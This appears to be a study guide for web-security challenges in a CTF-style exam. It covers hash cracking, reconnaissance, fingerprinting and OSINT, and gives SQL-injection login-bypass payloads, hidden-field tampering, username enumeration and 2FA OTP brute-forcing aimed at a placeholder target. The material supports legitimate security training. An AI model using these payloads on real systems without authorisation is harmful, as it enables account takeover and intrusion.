# 🟢 EASY Challenges (Success Ratio: 100%)

> These are foundational skills. You MUST ace all 10 of these.

---

## Challenge 1: Observation of Encrypted/Hashed/Encoded String

### What They Test
Can you identify and decode/decrypt strings in different formats?

### Key Concepts
| Format           | Characteristics                            | Example                                    |
| ---------------- | ------------------------------------------ | ------------------------------------------ |
| **Base64**       | Ends with `=` or `==`, chars `A-Za-z0-9+/` | `SGVsbG8=` → Hello                         |
| **Hex**          | Only `0-9a-f`, even length                 | `48656c6c6f` → Hello                       |
| **URL Encoding** | `%XX` format                               | `%48%65%6c%6c%6f` → Hello                  |
| **MD5**          | 32 hex chars                               | `5d41402abc4b2a76b9719d911017c592`         |
| **SHA1**         | 40 hex chars                               | `aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d` |
| **SHA256**       | 64 hex chars                               | `2cf24dba5fb0a30e26e83b2ac5b9e29e...`      |
| **bcrypt**       | Starts with `$2a$` or `$2b$`               | `$2a$10$...`                               |
| **JWT**          | Three `.` separated Base64 parts           | `eyJhb...`                                 |
| **ROT13**        | Letters shifted 13 positions               | `Uryyb` → Hello                            |

### Methodology
1. **Identify** the encoding/hash type by examining format
2. **Decode** using appropriate tool
3. If it's a hash, try **cracking** with known wordlists

### Tools & Commands
```bash
# Base64
echo "SGVsbG8=" | base64 -d

# Hex
echo "48656c6c6f" | xxd -r -p

# URL decode
python3 -c "import urllib.parse; print(urllib.parse.unquote('%48%65%6c%6c%6f'))"

# Identify hash type
hash-identifier
hashid <hash>

# Crack hashes
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt   # MD5
hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt  # SHA1
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# JWT decode
echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d

# CyberChef (browser) - drag & drop operations
# https://gchq.github.io/CyberChef/
```

---

## Challenge 2: Web Time Traveller

### What They Test
Can you find old/archived versions of a website to discover hidden information?

### Methodology
1. Use **Wayback Machine** to view historical snapshots
2. Check `robots.txt` for disallowed paths
3. Look for exposed **source maps**, old **backup files**
4. Check **HTTP headers** for version information
5. Check **JavaScript comments** for historical data

### Tools & Commands
```bash
# Wayback Machine
# Visit: https://web.archive.org/web/*/target-url

# Wayback Machine CLI
waybackurls target.com | sort -u

# Check robots.txt
curl https://target.com/robots.txt

# Look for common backup files
curl https://target.com/backup.zip
curl https://target.com/.git/config
curl https://target.com/index.html.bak

# Google cache
# Search: cache:target.com

# Check for sitemap
curl https://target.com/sitemap.xml
```

---

## Challenge 3: User Login Bypass

### What They Test
Can you bypass a login form using basic SQL injection or default credentials?

### Methodology
1. Try **default credentials** first (admin:admin, admin:password, etc.)
2. Try **SQL injection** in login fields
3. Check for **authentication bypass** via response manipulation
4. Look for **hardcoded credentials** in JavaScript/source

### Common SQLi Login Bypass Payloads
```
Username: admin' --
Password: anything

Username: admin' OR '1'='1' --
Password: anything

Username: ' OR 1=1 --
Password: anything

Username: admin'/*
Password: */OR '1'='1

Username: ' OR '1'='1'#
Password: anything

Username: admin' OR '1'='1' /*
Password: anything
```

### Steps
1. View page source → look for hidden fields, JS validation
2. Try default creds: `admin:admin`, `admin:password`, `test:test`
3. Try SQLi payloads in username field
4. If WAF blocks, try encoding payloads
5. Intercept login request in Burp → modify response (change `false` to `true`)

---

## Challenge 4: Server Fingerprinting

### What They Test
Can you identify the server technology, version, and running services?

### Methodology
```bash
# Nmap scan
nmap -sV -sC -A target.com
nmap -p- --min-rate 5000 target.com

# Banner grabbing
nc -v target.com 80
curl -I target.com        # HTTP headers
curl -v target.com 2>&1 | grep "Server:"

# Web technology identification
whatweb target.com
wappalyzer (browser extension)

# Check specific headers
curl -s -I target.com | grep -iE "server|x-powered-by|x-aspnet"

# Nikto scan
nikto -h target.com

# SSL/TLS info
sslscan target.com
sslyze target.com
```

### Key Headers to Look For
- `Server:` → Web server (Apache, Nginx, IIS)
- `X-Powered-By:` → Backend language (PHP, ASP.NET)
- `X-AspNet-Version:` → ASP.NET version
- `X-Generator:` → CMS info (WordPress, Drupal)

---

## Challenge 5: HTTP Form Manipulation

### What They Test
Can you manipulate form data that is sent to the server?

### Methodology
1. **Intercept** the request with Burp Suite
2. **Modify** hidden fields, prices, quantities, role parameters
3. **Replay** the modified request

### Steps
```
1. Open Burp Suite → Proxy → Intercept On
2. Submit the form in browser
3. In Burp, modify:
   - Hidden fields (price, role, isAdmin)
   - Change POST parameters
   - Modify cookie values
   - Change HTTP method (POST → GET)
4. Forward the modified request
```

### Common Targets
```html
<!-- Change hidden price field -->
<input type="hidden" name="price" value="100">  → Change to value="1"

<!-- Change role -->
<input type="hidden" name="role" value="user">  → Change to value="admin"

<!-- Change quantity -->
<input type="hidden" name="discount" value="0">  → Change to value="99"
```

---

## Challenge 6: Client-Side Input Validation Bypass

### What They Test
Can you bypass JavaScript validation that only runs in the browser?

### Methodology
1. **Disable JavaScript** in browser (F12 → Settings → Disable JS)
2. **Intercept with Burp** and modify after JS validation
3. **Edit HTML** directly in DevTools to remove validation attributes
4. **Use curl/Postman** to send requests without browser validation

### Steps
```
Method 1: Burp Suite
1. Let the form submit normally through JS validation
2. Intercept in Burp → modify the validated values
3. Forward the request

Method 2: Browser DevTools (F12)
1. Inspect the input field
2. Remove: maxlength, min, max, pattern, required attributes
3. Remove: onsubmit, onclick validation functions
4. Submit the form

Method 3: Disable JavaScript
1. Chrome → F12 → Settings (gear icon) → "Disable JavaScript"
2. Submit form without client-side validation

Method 4: Direct API call
curl -X POST https://target.com/submit \
  -d "field=malicious_value_bypassing_validation"
```

---

## Challenge 7: User ID Enumeration

### What They Test
Can you discover valid usernames/user IDs through application responses?

### Methodology
1. Observe **different error messages** for valid vs invalid users
2. Check **response times** (valid users may take longer)
3. Check **response size/status codes** for differences
4. Enumerate through **API endpoints**

### Steps
```bash
# Check login error messages
# "Invalid username" vs "Invalid password" = username enumeration

# Burp Intruder for username enumeration
1. Capture login request in Burp
2. Send to Intruder
3. Set payload position on username
4. Load username wordlist
5. Check response length/content for differences

# Check user profile endpoints
curl https://target.com/api/user/1
curl https://target.com/api/user/2
curl https://target.com/api/user/admin

# Check password reset functionality
# Different responses for existing vs non-existing emails

# Common wordlists
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
/usr/share/seclists/Usernames/Names/names.txt
```

### What to Look For
| Response for Valid User  | Response for Invalid User |
| ------------------------ | ------------------------- |
| "Wrong password"         | "User does not exist"     |
| 200 OK (longer response) | 200 OK (shorter response) |
| 302 Redirect             | 200 with error            |
| Response time: 500ms     | Response time: 100ms      |

---

## Challenge 8: 2FA Bypass Using Brute Force Attack

### What They Test
Can you bypass two-factor authentication by brute-forcing the OTP?

### Methodology
1. Check if there's **rate limiting** on OTP submissions
2. Check if the OTP is a **short numeric code** (4-6 digits)
3. Use **Burp Intruder** to brute force the code
4. Check if **same OTP** works for multiple attempts

### Steps
```
1. Login with valid credentials → get to 2FA page
2. Submit a test OTP → capture request in Burp
3. Send to Intruder
4. Set the OTP field as payload position
5. Generate payload: Numbers → 0000 to 9999 (4-digit) or 000000 to 999999 (6-digit)
6. Set threads to max allowed (check for rate limiting)
7. Look for different response length/status code = valid OTP
```

### Burp Intruder Settings
```
Payload type: Numbers
From: 0000
To: 9999
Step: 1
Min integer digits: 4
Max integer digits: 4
```

### Other 2FA Bypass Techniques
- **Skip the 2FA page** - directly navigate to the authenticated page URL
- **Reuse OTP** - try the same code multiple times
- **Null OTP** - send empty or `null` value
- **Response manipulation** - change `"success":false` to `"success":true`
- **Backup codes** - check if default backup codes exist

---

## Challenge 15: REST API HTTP Methods

### What They Test
Can you enumerate and exploit different HTTP methods on API endpoints?

### Methodology
```bash
# Check allowed methods
curl -X OPTIONS https://target.com/api/resource -I
# Look for: Allow: GET, POST, PUT, DELETE, PATCH, OPTIONS

# Test each method
curl -X GET https://target.com/api/users
curl -X POST https://target.com/api/users -d '{"name":"test"}'
curl -X PUT https://target.com/api/users/1 -d '{"role":"admin"}'
curl -X DELETE https://target.com/api/users/1
curl -X PATCH https://target.com/api/users/1 -d '{"isAdmin":true}'

# Method override (if certain methods are blocked)
curl -X POST https://target.com/api/resource \
  -H "X-HTTP-Method-Override: DELETE"
curl -X POST https://target.com/api/resource \
  -H "X-Method-Override: PUT"

# Check for verb tampering
# If GET is restricted, try POST or PUT
# If POST is restricted, try using GET with query params
```

### Common API Endpoints to Test
```
/api/users        → List all users
/api/users/1      → Get specific user
/api/admin         → Admin panel
/api/config        → Configuration
/api/debug         → Debug info
/api/swagger.json  → API documentation
/api/v1/           → Version 1 endpoints
```

---

## Challenge 26: Passive Information Collection

### What They Test
Can you gather information about a target WITHOUT directly touching it?

### Methodology
```bash
# WHOIS lookup
whois target.com

# DNS records
dig target.com ANY
dig target.com MX
dig target.com TXT
nslookup -type=any target.com

# Subdomain enumeration (passive)
subfinder -d target.com
amass enum -passive -d target.com

# Google Dorking
site:target.com
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com intitle:"index of"
site:target.com ext:sql | ext:bak | ext:log

# Certificate Transparency
# https://crt.sh/?q=target.com

# Shodan
shodan search hostname:target.com

# theHarvester
theHarvester -d target.com -b google,linkedin,bing

# Social media / OSINT
# LinkedIn, GitHub, Twitter, Pastebin

# Check for data breaches
# https://haveibeenpwned.com

# DNS history
# https://securitytrails.com
# https://viewdns.info

# Email verification
# https://hunter.io
```
